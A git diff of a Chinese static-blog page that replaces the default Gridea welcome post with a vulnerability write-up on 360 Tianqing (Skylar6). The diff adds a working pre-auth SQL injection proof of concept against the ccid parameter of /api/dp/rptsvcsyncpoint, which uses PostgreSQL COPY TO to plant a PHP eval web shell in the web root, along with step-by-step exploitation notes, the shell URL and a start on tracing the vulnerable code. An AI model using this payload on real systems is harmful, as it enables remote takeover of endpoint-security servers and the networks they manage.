@@ -3,20 +3,15 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
-<title>Hello Gridea | P1and</title>
+<title>360天擎-前台SQL注入 | P1and</title>
 <link rel="stylesheet" href="https://p1and.github.io/styles/main.css">
 <script src="https://p1and.github.io/media/script.js"></script>
 
     
 
-  <meta name="description" content="👏  欢迎使用 Gridea ！
-✍️  Gridea 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...
-
-Github
-Gridea 主页
-示例网站
-特性👇
-📝  你可以使用最酷的 Markdo...">
+  <meta name="description" content="poc
+注入写shell:
+https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T TEXT);insert into O(T) values(...">
   <script src="https://p1and.github.io/media/prism.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 </head>
@@ -88,32 +83,39 @@ Gridea 主页
 </div>
       <div class="mb-20 md:flex mt-10 lg:mt-6 md:border-t md:border-gray-400 md:pt-2 lg:border-t-0 lg:pt-0">
         <div class="w-full md:w-2/3 mt-6">
-          <h1 class="text-4xl">Hello Gridea</h1>
-          
-            <img class="max-w-full mt-6 rounded-sm" src="https://p1and.github.io/post-images/hello-gridea.png" alt="">
+          <h1 class="text-4xl">360天擎-前台SQL注入</h1>
           
           <div class="mt-6 lg:mt-10 post-content">
-            <p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-<!-- more -->
-<p><a href="https://github.com/getgridea/gridea">Github</a><br>
-<a href="https://gridea.dev/">Gridea 主页</a><br>
-<a href="http://fehey.com/">示例网站</a></p>
-<h2 id="特性">特性👇</h2>
-<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
-<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
-<p>🏷️  你可以对文章进行标签分组</p>
-<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
-<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
-<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
-<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
-<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
-<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
-<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
-<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
-<p>未来，它一定会成为你离不开的伙伴</p>
-<p>尽情发挥你的才华吧！</p>
-<p>😘 Enjoy~</p>
+            <h2 id="poc">poc</h2>
+<pre><code>注入写shell:
+https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('&lt;?php @eval($_POST[1]);?&gt;');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
+</code></pre>
+<p>利用过程:<br>
+1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell<br>
+2. 通过注入点，创建一张表 O<br>
+3. 为 表O 添加一个新字段 T 并且写入shell内容<br>
+4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell)<br>
+5. 删除 表O</p>
+<pre><code>shell地址:
+    https://192.168.24.196:8443/1.php
+    POST
+        1=phpinfo();
+</code></pre>
+<h2 id="漏洞演示">漏洞演示</h2>
+<figure data-type="image" tabindex="1"><img src="https://p1and.github.io/post-images/1623839390994.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://p1and.github.io/post-images/1623839415860.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://p1and.github.io/post-images/1623839427979.png" alt="" loading="lazy"></figure>
+<h2 id="漏洞详情">漏洞详情</h2>
+<p>天擎默认安装位置: C:\Program Files (x86)\360\skylar6\</p>
+<p>首先打开：C:\Program Files (x86)\360\skylar6\www\data\adminlog_path_dict.json 该路径存放了大量的接口地址，并且可以该文件已列出是否开放接口</p>
+<figure data-type="image" tabindex="4"><img src="https://p1and.github.io/post-images/1623839439564.png" alt="" loading="lazy"></figure>
+<p>那么重点先查看一下这些开放的端口即可</p>
+<p>其中盯上了一个接口：api/dp/rptsvcsyncpoint</p>
+<p>通过查看yii手册知道了路由走向，接口文件地址：C:\Program Files (x86)\360\skylar6\www\application\api\controllers\DpController.php</p>
+<figure data-type="image" tabindex="5"><img src="https://p1and.github.io/post-images/1623839452209.png" alt="" loading="lazy"></figure>
+<p>进来以后看到它接收了 <code>$cc_id = $this-&gt;getParam(&quot;ccid&quot;)</code> 并且被 <code>getSyncPoint()</code> 方法接收</p>
+<p>跟进去<code>getSyncPoint()</code>方法 地址为: C:\Program Files (x86)\360\skylar6\www\source\domain\dao\DataPortalDao.php</p>
+<figure data-type="image" tabindex="6"><img src="https://p1and.github.io/post-images/1623839461074.jpg" alt="" loading="lazy"></figure>
 
           </div>
           
@@ -122,11 +124,9 @@ Gridea 主页
           <div class="w-full md:w-1/3">
             <div class="mt-6 md:pl-8">
               <h4 class="text-base font-thin text-gray-700 mb-2">发布时间</h4>
-              <div class="text-lg mb-6">2018-12-12</div>
+              <div class="text-lg mb-6">2021-06-16</div>
               <h4 class="text-base font-thin text-gray-700 mb-2">标签</h4>
               <div class="mb-6">
-                
-                  <a href="https://p1and.github.io/tag/eFghTUryf/" class="py-1 px-4 border-gray-300 border text-sm inline-block text-gray-700 hover:text-gray-900 rounded mr-2 mb-2">Gridea</a>
                 
               </div>
               <h4 class="text-base font-thin text-gray-700 mb-2">阅读时间</h4>
@@ -136,11 +136,9 @@ Gridea 主页
                 
 
   
-    
-      
-    
-  
 
+  
+    
   
 
 
